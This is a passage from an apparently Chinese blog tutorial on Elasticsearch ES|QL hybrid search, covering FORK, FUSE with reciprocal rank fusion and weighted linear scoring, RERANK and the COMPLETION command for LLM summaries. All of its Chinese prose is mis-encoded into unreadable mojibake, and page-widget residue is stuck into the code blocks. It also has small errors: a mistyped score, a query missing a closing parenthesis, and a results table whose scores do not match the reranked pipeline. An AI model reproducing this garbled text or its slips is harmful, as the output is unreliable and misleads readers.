<p>æ­£å¦‚ä½ ä¼šæ³¨æ„åˆ°çš„ï¼ŒæŸäº›æ–‡æ¡£ä¼šå‡ºç°ä¸¤æ¬¡ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬éšåä½¿ç”¨ FUSE æ¥åˆå¹¶è¡¨ç¤ºç›¸åŒæ–‡æ¡£çš„è¡Œå¹¶åˆ†é…æ–°çš„ç›¸å…³æ€§åˆ†æ•°çš„åŸå› ã€‚FUSE åˆ†ä¸¤é˜¶æ®µæ‰§è¡Œï¼š</p>
<ul>
<li>å¯¹æ¯ä¸€è¡Œï¼ŒFUSE æ ¹æ®æ‰€ä½¿ç”¨çš„ hybrid search ç®—æ³•åˆ†é…æ–°çš„ç›¸å…³æ€§åˆ†æ•°ã€‚</li>
<li>è¡¨ç¤ºç›¸åŒæ–‡æ¡£çš„è¡Œä¼šè¢«åˆå¹¶ï¼Œå¹¶è®¡ç®—æ–°çš„åˆ†æ•°ã€‚</li>
</ul>
<p>åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ RRFã€‚ç¬¬ä¸€æ­¥ï¼ŒFUSE ä½¿ç”¨ RRF å…¬å¼ä¸ºæ¯ä¸€è¡Œåˆ†é…æ–°çš„åˆ†æ•°ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">`<span class="hljs-built_in">score</span>(doc) = <span class="hljs-number">1</span> / (rank_constant + rank(doc))`AIå†™ä»£ç 
</code></pre>
<p>å…¶ä¸­ rank_constant çš„é»˜è®¤å€¼ä¸º 60ï¼Œrank(doc) è¡¨ç¤ºæ–‡æ¡£åœ¨ç»“æœé›†ä¸­çš„ä½ç½®ã€‚</p>
<p>åœ¨ç¬¬ä¸€é˜¶æ®µï¼Œæˆ‘ä»¬çš„ç»“æœå˜ä¸ºï¼š</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th><th>_fork</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>1 / (60 + 1) = 0.01639</td><td>fork1</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>1 / (60 + 2) = 0.01613</td><td>fork1</td></tr><tr><td>4005</td><td>The Two Towers</td><td>1 / (60 + 3) = 0.01587</td><td>fork1</td></tr><tr><td>4006</td><td>The Return of the King</td><td>1 / (60 + 4) = 0.01563</td><td>fork1</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>1 / (60 + 5) = 0.01538</td><td>fork1</td></tr><tr><td>4144</td><td>The Children of HÃºrin</td><td>1 / (60 + 6) = 0.01515</td><td>fork1</td></tr><tr><td>4001</td><td>The Hobbit</td><td>1 / (60 + 1) = 0.01639</td><td>fork2</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>1 / (60 + 2) = 0.01613</td><td>fork2</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>1 / (60 + 3) = 0.01587</td><td>fork2</td></tr><tr><td>4005</td><td>The Two Towers</td><td>1 / (60 + 4) = 0.01563</td><td>fork2</td></tr><tr><td>4006</td><td>The Return of the King</td><td>1 / (60 + 5) = 0.01538</td><td>fork2</td></tr></tbody></table>
<p>ç„¶åè¿™äº›è¡Œä¼šè¢«åˆå¹¶ï¼Œå¹¶åˆ†é…æ–°çš„åˆ†æ•°ã€‚ç”±äº FUSE å‘½ä»¤åè·Ÿ SORT _score DESCï¼Œæœ€ç»ˆç»“æœä¸ºï¼š</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.01639 + 0.01639 = 0.03279</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.01613 + 0.01613 = 0.03226</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.01587 + 0.01563 = 0.0315</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.01538 + 0.01587 = 0.03125</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.01563 + 0.01538 = 0.03101</td></tr><tr><td>4144</td><td>The Children of HÃºrin</td><td>0.01515</td></tr></tbody></table>
<h3 data-id="heading-3">æ··åˆæœç´¢ï¼šscores çš„çº¿æ€§ç»„åˆ</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Frest-apis%2Freciprocal-rank-fusion" title="https://www.elastic.co/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion" target="_blank" ref="nofollow noopener noreferrer">Reciprocal rank fusion</a> æ˜¯æ‰§è¡Œ hybrid search æœ€ç®€å•çš„æ–¹æ³•ï¼Œä½†å®ƒä¸æ˜¯æˆ‘ä»¬åœ¨ ES|QL ä¸­æ”¯æŒçš„å”¯ä¸€ hybrid search æ–¹æ³•ã€‚</p>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ FUSE é€šè¿‡ scores çš„çº¿æ€§ç»„åˆæ¥åˆå¹¶ lexical å’Œ semantic search ç»“æœï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(semantic_description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE LINEAR <span class="hljs-keyword">WITH</span> { "weights": { "fork1": <span class="hljs-number">0.7</span>, "fork2": <span class="hljs-number">0.3</span> } }
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AIå†™ä»£ç 
</code></pre>
<p>è®©æˆ‘ä»¬å…ˆåˆ†è§£æŸ¥è¯¢ï¼Œå¹¶æŸ¥çœ‹å½“åªè¿è¡Œ FORK å‘½ä»¤æ—¶ FUSE å‘½ä»¤çš„è¾“å…¥ã€‚</p>
<p>æ³¨æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨ match å‡½æ•°ï¼Œå®ƒä¸ä»…å¯ä»¥æŸ¥è¯¢ lexical å­—æ®µï¼Œå¦‚ text æˆ– keywordï¼Œè¿˜å¯ä»¥æŸ¥è¯¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Fmapping-reference%2Fsemantic-text" title="https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/semantic-text" target="_blank" ref="nofollow noopener noreferrer">semantic_text</a> å­—æ®µã€‚</p>
<p>ç¬¬ä¸€ä¸ª FORK åˆ†æ”¯é€šè¿‡æŸ¥è¯¢ semantic_text å­—æ®µæ‰§è¡Œ semantic queryï¼Œè€Œç¬¬äºŒä¸ªåˆ†æ”¯æ‰§è¡Œ lexical queryï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(semantic_description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)

`AIå†™ä»£ç 
</code></pre>
<p>FORK å‘½ä»¤çš„è¾“å‡ºå¯èƒ½åŒ…å«å…·æœ‰ç›¸åŒ _id å’Œ _index å€¼çš„è¡Œï¼Œè¿™äº›è¡Œè¡¨ç¤ºåŒä¸€ä¸ª Elasticsearch æ–‡æ¡£ï¼š</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th><th>_fork</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.88</td><td>fork1</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.88</td><td>fork1</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.86</td><td>fork1</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.84</td><td>fork1</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.78</td><td>fork1</td></tr><tr><td>4144</td><td>The Children of HÃºrin</td><td>0.79</td><td>fork1</td></tr><tr><td>4001</td><td>The Hobbit</td><td>4.55</td><td>fork2</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>4.25</td><td>fork2</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>4.11</td><td>fork2</td></tr><tr><td>4005</td><td>The Two Towers</td><td>3.8</td><td>fork2</td></tr><tr><td>4006</td><td>The Return of the King</td><td>4.1</td><td>fork2</td></tr></tbody></table>
<p>åœ¨ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ FUSE åˆå¹¶å…·æœ‰ç›¸åŒ _id å’Œ _index å€¼çš„è¡Œï¼Œå¹¶åˆ†é…æ–°çš„ç›¸å…³æ€§åˆ†æ•°ã€‚</p>
<p>æ–°çš„åˆ†æ•°æ˜¯è¯¥è¡Œåœ¨æ¯ä¸ª FORK åˆ†æ”¯ä¸­çš„åˆ†æ•°çš„çº¿æ€§ç»„åˆï¼š</p>
<pre><code class="hljs language-ini" lang="ini">`<span class="hljs-attr">_score</span> = <span class="hljs-number">0.7</span> *_score1 + <span class="hljs-number">0.3</span> * _score2`AIå†™ä»£ç 
</code></pre>
<p>è¿™é‡Œï¼Œ_score1 å’Œ _score2 åˆ†åˆ«è¡¨ç¤ºæ–‡æ¡£åœ¨ç¬¬ä¸€ä¸ª FORK åˆ†æ”¯å’Œç¬¬äºŒä¸ª FORK åˆ†æ”¯ä¸­çš„åˆ†æ•°ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼Œæˆ‘ä»¬è¿˜åº”ç”¨äº†è‡ªå®šä¹‰æƒé‡ï¼Œå¯¹ semantic score ç»™äºˆæ¯” lexical score æ›´é«˜çš„æƒé‡ï¼Œå¾—åˆ°è¿™ä¸€ç»„æ–‡æ¡£ï¼š</p>
</blockquote>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.7 * 0.88 + 0.3 * 4.55 = 1.981</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.7 * 0.88 + 0.3 * 4.25 = 1.891</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.7 * 0.84 + 0.3 * 4.1 = 1.818</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.7 * 0.78 + 0.3 * 4.11 = 1.779</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.7 * 0.86 + 0.3 * 3.8 = 1.742</td></tr><tr><td>4144</td><td>The Children of HÃºrin</td><td>0.7 * 0.79 + 0.3 * 0 = 0.553</td></tr></tbody></table>
<p>ä¸€ä¸ªæŒ‘æˆ˜æ˜¯ semantic score å’Œ lexical score å¯èƒ½ä¸å…¼å®¹ç›´æ¥è¿›è¡Œçº¿æ€§ç»„åˆï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½éµå¾ªå®Œå…¨ä¸åŒçš„åˆ†å¸ƒã€‚ä¸ºç¼“è§£è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å¯¹åˆ†æ•°è¿›è¡Œå½’ä¸€åŒ–ï¼Œä½¿ç”¨ score normalization æ–¹æ³•ï¼Œå¦‚ minmaxã€‚è¿™æ ·å¯ä»¥ç¡®ä¿æ¯ä¸ª FORK åˆ†æ”¯çš„åˆ†æ•°åœ¨åº”ç”¨çº¿æ€§ç»„åˆå…¬å¼å‰å…ˆè¢«å½’ä¸€åŒ–åˆ° 0 åˆ° 1 ä¹‹é—´çš„å€¼ã€‚</p>
<p>è¦ä½¿ç”¨ FUSE å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®š normalizer é€‰é¡¹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(semantic_description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE LINEAR <span class="hljs-keyword">WITH</span> { "weights": { "fork1": <span class="hljs-number">0.7</span>, "fork2": <span class="hljs-number">0.3</span> }, "normalizer": "minmax" }
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AIå†™ä»£ç 
</code></pre>
<h3 data-id="heading-4">Semantic reranking</h3>
<p>åœ¨è¿™ä¸€é˜¶æ®µï¼Œç»è¿‡ hybrid search åï¼Œæˆ‘ä»¬åº”è¯¥åªå‰©ä¸‹æœ€ç›¸å…³çš„æ–‡æ¡£ã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨ semantic <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F143352429" title="https://elasticstack.blog.csdn.net/article/details/143352429" target="_blank" ref="nofollow noopener noreferrer">reranking</a> é€šè¿‡ RERANK å‘½ä»¤é‡æ–°æ’åºç»“æœã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒRERANK ä½¿ç”¨æœ€æ–°çš„ Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Franking%2Fsemantic-reranking" title="https://www.elastic.co/docs/solutions/search/ranking/semantic-reranking" target="_blank" ref="nofollow noopener noreferrer">semantic reranking</a>Â æœºå™¨å­¦ä¹ æ¨¡å‹ï¼Œå› æ­¤æ— éœ€é¢å¤–é…ç½®ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">6.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>
<span class="hljs-number">7.</span>  <span class="hljs-operator">|</span> RERANK ?query <span class="hljs-keyword">ON</span> description
<span class="hljs-number">8.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AIå†™ä»£ç 
</code></pre>
<p>æˆ‘ä»¬ç°åœ¨å¾—åˆ°äº†æŒ‰ç›¸å…³æ€§æ’åºçš„æœ€ä½³ç»“æœã€‚</p>
<p>RERANK å‘½ä»¤åŒºåˆ«äºå…¶ä»–æä¾› semantic reranking é›†æˆçš„äº§å“çš„ä¸€ä¸ªå…³é”®ç‰¹æ€§æ˜¯ï¼Œå®ƒä¸è¦æ±‚è¾“å…¥å¿…é¡»æ˜¯ç´¢å¼•ä¸­çš„æ˜ å°„å­—æ®µã€‚RERANK åªéœ€è¦ä¸€ä¸ªèƒ½æ±‚å€¼ä¸ºå­—ç¬¦ä¸²çš„è¡¨è¾¾å¼ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å¤šä¸ªå­—æ®µè¿›è¡Œ semantic rerankingï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">6.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>
<span class="hljs-number">7.</span>  <span class="hljs-operator">|</span> RERANK ?query <span class="hljs-keyword">ON</span> CONCAT(title, "\n", description) 
<span class="hljs-number">8.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AIå†™ä»£ç 
</code></pre>
<h2 data-id="heading-5">LLM completions</h2>
<p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ç»„é«˜åº¦ç›¸å…³ã€é‡æ–°æ’åºçš„ç»“æœã€‚</p>
<p>åœ¨è¿™ä¸€é˜¶æ®µï¼Œä½ å¯ä»¥é€‰æ‹©ç›´æ¥å°†ç»“æœè¿”å›ç»™ä½ çš„åº”ç”¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ LLM completions è¿›ä¸€æ­¥å¢å¼ºç»“æœã€‚</p>
<p>å¦‚æœä½ åœ¨ retrieval-augmented generation (<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F134396254" title="https://elasticstack.blog.csdn.net/article/details/134396254" target="_blank" ref="nofollow noopener noreferrer">RAG</a>) å·¥ä½œæµä¸­ä½¿ç”¨ ES|QLï¼Œä½ å¯ä»¥é€‰æ‹©ç›´æ¥ä» ES|QL è°ƒç”¨ä½ å–œæ¬¢çš„ LLMã€‚<br/>
ä¸ºæ­¤ï¼Œæˆ‘ä»¬æ–°å¢äº† COMPLETION å‘½ä»¤ï¼Œå®ƒæ¥å—ä¸€ä¸ª promptã€ä¸€ä¸ª completion <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Felastic-inference" title="https://www.elastic.co/docs/explore-analyze/elastic-inference" target="_blank" ref="nofollow noopener noreferrer">inference</a> IDï¼ˆæŒ‡å®šè°ƒç”¨å“ªä¸ª LLMï¼‰ä»¥åŠä¸€ä¸ªåˆ—æ ‡è¯†ç¬¦ï¼ˆæŒ‡å®š LLM å“åº”è¾“å‡ºåˆ°å“ªä¸€åˆ—ï¼‰ã€‚</p>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ COMPLETION æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ _completion åˆ—ï¼Œå…¶ä¸­åŒ…å« content åˆ—çš„æ‘˜è¦ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">6.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>
<span class="hljs-number">7.</span>  <span class="hljs-operator">|</span> RERANK ?query <span class="hljs-keyword">ON</span> description
<span class="hljs-number">8.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">9.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">10</span>
<span class="hljs-number">10.</span>  <span class="hljs-operator">|</span> COMPLETION CONCAT("Summarize the following:\n", description) <span class="hljs-keyword">WITH</span> { "inference_id" : "my_inference_endpoint" }` AIå†™ä»£ç <span class="hljs-operator">!</span>[](https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>csdnimg.cn<span class="hljs-operator">/</span><span class="hljs-keyword">release</span><span class="hljs-operator">/</span>blogv2<span class="hljs-operator">/</span>dist<span class="hljs-operator">/</span>pc<span class="hljs-operator">/</span>img<span class="hljs-operator">/</span>runCode<span class="hljs-operator">/</span>icon<span class="hljs-operator">-</span>arrowwhite.png)
</code></pre>
<p>æ¯ä¸€è¡Œç°åœ¨éƒ½åŒ…å«ä¸€ä¸ªæ‘˜è¦ï¼š</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th><th>summary</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.03279</td><td>Bilbo helps dwarves reclaim Erebor from the dragon Smaug.</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.03226</td><td>Frodo begins the quest to destroy the One Ring.</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.0315</td><td>The Fellowship splits; war comes to Rohan; Frodo nears Mordor.</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.03125</td><td>Ancient myths and history of Middle-earth's First Age.</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.3101</td><td>Sauron is defeated and Aragorn is crowned King.</td></tr><tr><td>4144</td><td>The Children of HÃºrin</td><td>0.01515</td><td>The tragic tale of TÃºrin Turambar's cursed life.</td></tr></tbody></table>
<p>åœ¨å¦ä¸€ç§ç”¨ä¾‹ä¸­ï¼Œä½ å¯èƒ½åªæ˜¯æƒ³ä½¿ç”¨è‡ªå·±åœ¨ Elasticsearch ä¸­ç´¢å¼•çš„ä¸“æœ‰æ•°æ®æ¥å›ç­”é—®é¢˜ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åœ¨å‰ä¸€é˜¶æ®µè®¡ç®—å‡ºçš„æœ€ä½³æœç´¢ç»“æœå¯ä»¥ä½œä¸º prompt çš„ä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">6.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>
<span class="hljs-number">7.</span>  <span class="hljs-operator">|</span> RERANK ?query <span class="hljs-keyword">ON</span> description
<span class="hljs-number">8.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">9.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">10</span>
<span class="hljs-number">10.</span>  <span class="hljs-operator">|</span> STATS context <span class="hljs-operator">=</span> <span class="hljs-keyword">VALUES</span>(CONCAT(title, "\n", description)
<span class="hljs-number">11.</span>  <span class="hljs-operator">|</span> COMPLETION CONCAT("Answer the following question ", ?query, "based on:\n", context) <span class="hljs-keyword">WITH</span> { "inference_id" : "my_inference_endpoint" }

`AIå†™ä»£ç <span class="hljs-operator">!</span>[](https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>csdnimg.cn<span class="hljs-operator">/</span><span class="hljs-keyword">release</span><span class="hljs-operator">/</span>blogv2<span class="hljs-operator">/</span>dist<span class="hljs-operator">/</span>pc<span class="hljs-operator">/</span>img<span class="hljs-operator">/</span>runCode<span class="hljs-operator">/</span>icon<span class="hljs-operator">-</span>arrowwhite.png)
</code></pre>
<p>ç”±äº COMPLETION å‘½ä»¤è§£é”äº†å‘ LLM å‘é€ä»»æ„ prompt çš„èƒ½åŠ›ï¼Œå¯èƒ½æ€§æ˜¯æ— ç©·çš„ã€‚è™½ç„¶æˆ‘ä»¬åªå±•ç¤ºäº†ä¸€äº›ç¤ºä¾‹ï¼Œä½† COMPLETION å‘½ä»¤å¯ä»¥ç”¨äºå„ç§åœºæ™¯ï¼Œä»å®‰å…¨åˆ†æå¸ˆæ ¹æ®æ—¥å¿—äº‹ä»¶æ˜¯å¦å¯èƒ½è¡¨ç¤ºæ¶æ„è¡Œä¸ºæ¥åˆ†é…åˆ†æ•°ï¼Œåˆ°æ•°æ®ç§‘å­¦å®¶ç”¨å®ƒåˆ†ææ•°æ®ï¼Œç”šè‡³åˆ°ä»…ä»…<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F150973787" title="https://elasticstack.blog.csdn.net/article/details/150973787" target="_blank" ref="nofollow noopener noreferrer">æ ¹æ®ä½ çš„æ•°æ®ç”Ÿæˆ Chuck Norris äº‹å®</a>çš„æƒ…å†µã€‚</p>
<h2 data-id="heading-6">è¿™åªæ˜¯å¼€å§‹</h2>
<p>æœªæ¥ï¼Œæˆ‘ä»¬å°†æ‰©å±• ES|QLï¼Œä»¥æ”¹è¿›é•¿æ–‡æ¡£çš„ semantic rerankingï¼Œæ›´å¥½åœ°ä½¿ç”¨å¤šä¸ª FORK å‘½ä»¤è¿›è¡Œ ES|QL æŸ¥è¯¢çš„æ¡ä»¶æ‰§è¡Œï¼Œæ”¯æŒ sparse vector æŸ¥è¯¢ï¼Œå»é™¤è¿‘ä¼¼é‡å¤ç»“æœä»¥æé«˜ç»“æœå¤šæ ·æ€§ï¼Œå…è®¸å¯¹è¿è¡Œæ—¶ç”Ÿæˆçš„åˆ—è¿›è¡Œå…¨æ–‡æœç´¢ï¼Œä»¥åŠæ›´å¤šå…¶ä»–åœºæ™¯ã€‚</p>
<p>æ›´å¤šæ•™ç¨‹å’ŒæŒ‡å—ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Fesql-for-search" title="https://www.elastic.co/docs/solutions/search/esql-for-search" target="_blank" ref="nofollow noopener noreferrer">ES|QL for search</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fesql-search-tutorial" title="https://www.elastic.co/docs/reference/query-languages/esql/esql-search-tutorial" target="_blank" ref="nofollow noopener noreferrer">ES|QL for search tutorial</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Fmapping-reference%2Fsemantic-text" title="https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/semantic-text" target="_blank" ref="nofollow noopener noreferrer">Semantic_text field type</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fcommands%2Ffork" title="https://www.elastic.co/docs/reference/query-languages/esql/commands/fork" target="_blank" ref="nofollow noopener noreferrer">FORK</a> and <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fcommands%2Ffuse" title="https://www.elastic.co/docs/reference/query-languages/esql/commands/fuse" target="_blank" ref="nofollow noopener noreferrer">FUSE</a> æ–‡æ¡£</li>
<li>ES|QL search functions</li>
</ul>
